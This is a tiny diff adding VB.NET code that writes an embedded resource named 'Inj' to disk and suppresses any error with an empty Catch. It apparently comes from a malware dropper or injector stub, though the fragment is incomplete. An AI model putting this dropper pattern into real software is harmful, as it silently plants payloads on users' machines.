@@ -1,0 +1,4 @@
+Try
+	IO.File.WriteAllBytes(ooo, R.GetObject("Inj"))
+Catch
+End Try
